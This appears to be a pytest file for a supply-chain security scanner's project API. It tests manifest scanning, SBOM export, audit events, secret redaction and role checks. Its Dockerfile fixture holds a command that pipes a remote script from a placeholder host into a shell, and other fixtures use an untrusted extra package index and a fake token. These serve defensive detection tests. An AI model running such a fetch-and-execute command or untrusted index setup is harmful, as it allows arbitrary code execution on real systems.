"""Project API: manifest scans, stored verdict enrichment, graph, SBOM, audit, events and RBAC."""

from __future__ import annotations

import uuid

import pytest
from sqlalchemy import select

from app.core.permissions import Role
from app.core.security import create_access_token
from app.db.models import AuditEvent, Decision, Scan, SecurityEvent, Severity, User
from app.db.session import SessionLocal
from tests.conftest import auth

CLEAN = {"requirements.txt": "requests==2.32.3\n"}
RISKY = {"requirements.txt": "--extra-index-url https://packages.example.invalid/simple\nflask>=3\n"}


def _name(prefix: str = "proj") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:10]}"


def _token(role: Role) -> str:
    with SessionLocal() as db:
        user = User(id=uuid.uuid4(), email=f"proj-{role.value}-{uuid.uuid4().hex[:8]}@warden.io",
                    password_hash="unused", role=role)
        db.add(user)
        db.commit()
        return create_access_token(subject=str(user.id), role=role.value)


def _create(client, token, name=None) -> dict:
    resp = client.post("/api/v1/projects", headers=auth(token), json={"name": name or _name()})
    assert resp.status_code == 201, resp.text
    return resp.json()


def test_create_list_get_and_duplicate(client, admin_token):
    name = _name()
    project = _create(client, admin_token, name)
    assert client.get(f"/api/v1/projects/{project['id']}", headers=auth(admin_token)).json()["name"] == name
    listed = client.get("/api/v1/projects?limit=200", headers=auth(admin_token)).json()
    assert any(p["id"] == project["id"] for p in listed["items"])
    again = client.post("/api/v1/projects", headers=auth(admin_token), json={"name": name})
    assert again.status_code == 409


def test_scan_stores_components_graph_findings_and_sbom(client, admin_token):
    project = _create(client, admin_token)
    resp = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
                       json={"files": RISKY})
    assert resp.status_code == 201, resp.text
    scan = resp.json()
    codes = {f["code"] for f in scan["summary"]["findings"]}
    assert "INDEX_SOURCE_AMBIGUITY" in codes
    assert scan["decision"] in ("warn", "block") and scan["component_count"] == 1

    base = f"/api/v1/projects/{project['id']}/scans/{scan['id']}"
    components = client.get(f"{base}/components", headers=auth(admin_token)).json()
    assert components["items"][0]["name"] == "flask" and components["items"][0]["risk_score"] is None
    graph = client.get(f"{base}/graph", headers=auth(admin_token)).json()
    assert graph["nodes"] and "metrics" in graph
    cdx = client.get(f"{base}/sbom", headers=auth(admin_token)).json()
    assert cdx["bomFormat"] == "CycloneDX"
    spdx = client.get(f"{base}/sbom?format=spdx", headers=auth(admin_token)).json()
    assert spdx["spdxVersion"] == "SPDX-2.3"
    assert client.get(f"{base}/sbom?format=xml", headers=auth(admin_token)).status_code == 422

    history = client.get(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token)).json()
    assert history["total"] == 1

    with SessionLocal() as db:
        pid = uuid.UUID(project["id"])
        types = set(db.scalars(select(SecurityEvent.type).where(SecurityEvent.project_id == pid)))
        assert {"project_scanned", "sbom_generated"} <= types
        assert db.scalar(select(AuditEvent).where(AuditEvent.action == "project.scan",
                                                  AuditEvent.target_id == project["id"]))


def test_components_are_enriched_with_stored_verdicts(client, admin_token):
    package = _name("pkg")
    with SessionLocal() as db:
        db.add(Scan(id=uuid.uuid4(), ecosystem="pypi", package_name=package.replace("-", "_").upper(),
                    version="1.0.0", analyzer_version="t", severity=Severity.critical,
                    decision=Decision.block, risk_score=91, environment="production"))
        db.commit()
    project = _create(client, admin_token)
    scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
                       json={"files": {"requirements.txt": f"{package}==1.0.0\n"}}).json()
    assert scan["decision"] == "block" and scan["risk_score"] == 91
    items = client.get(f"/api/v1/projects/{project['id']}/scans/{scan['id']}/components",
                       headers=auth(admin_token)).json()["items"]
    assert items[0]["decision"] == "block" and items[0]["scan_id"]


def test_submitted_dockerfiles_are_linted(client, admin_token):
    project = _create(client, admin_token)
    dockerfile = "\n".join(["FROM python:3.12", "RUN wget -qO- https://x.invalid/i.sh | sh", ""])
    files = {**CLEAN, "Dockerfile": dockerfile}
    scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
                       json={"files": files}).json()
    codes = {f["code"] for f in scan["summary"]["findings"]}
    assert {"DOCKERFILE_CURL_PIPE_SHELL", "DOCKERFILE_ROOT_USER", "DOCKERFILE_UNPINNED_BASE"} <= codes
    assert scan["decision"] == "block"


def test_clean_manifest_allows(client, admin_token):
    project = _create(client, admin_token)
    scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token),
                       json={"files": CLEAN}).json()
    assert scan["decision"] == "allow"


@pytest.mark.parametrize("files", [
    {},
    {"notes.md": "hello"},
    {f"r{i}/requirements.txt": "x==1\n" for i in range(51)},
    {"requirements.txt": "a" * 1_000_001},
])
def test_bad_manifest_submissions_are_rejected(client, admin_token, files):
    project = _create(client, admin_token)
    resp = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token), json={"files": files})
    assert resp.status_code == 422


def test_secrets_in_manifests_are_not_stored_in_clear(client, admin_token):
    token = "gh" + "p_" + "D" * 36
    project = _create(client, admin_token)
    files = {"requirements.txt": f"--extra-index-url https://user:{token}@pypi.example.invalid/simple\nflask==3.0.0\n"}
    scan = client.post(f"/api/v1/projects/{project['id']}/scans", headers=auth(admin_token), json={"files": files})
    assert scan.status_code == 201
    assert token not in scan.text
    sbom = client.get(f"/api/v1/projects/{project['id']}/scans/{scan.json()['id']}/sbom", headers=auth(admin_token))
    assert token not in sbom.text


def test_scans_of_another_project_are_not_reachable(client, admin_token):
    one, two = _create(client, admin_token), _create(client, admin_token)
    scan = client.post(f"/api/v1/projects/{one['id']}/scans", headers=auth(admin_token), json={"files": CLEAN}).json()
    assert client.get(f"/api/v1/projects/{two['id']}/scans/{scan['id']}", headers=auth(admin_token)).status_code == 404
    assert client.get(f"/api/v1/projects/{uuid.uuid4()}", headers=auth(admin_token)).status_code == 404


@pytest.mark.parametrize(("role", "write", "read"), [
    (Role.admin, 201, 200), (Role.security_analyst, 201, 200), (Role.developer, 201, 200),
    (Role.auditor, 403, 200), (Role.read_only, 403, 200),
])
def test_role_matrix(client, role, write, read):
    token = _token(role)
    assert client.post("/api/v1/projects", headers=auth(token), json={"name": _name()}).status_code == write
    assert client.get("/api/v1/projects", headers=auth(token)).status_code == read
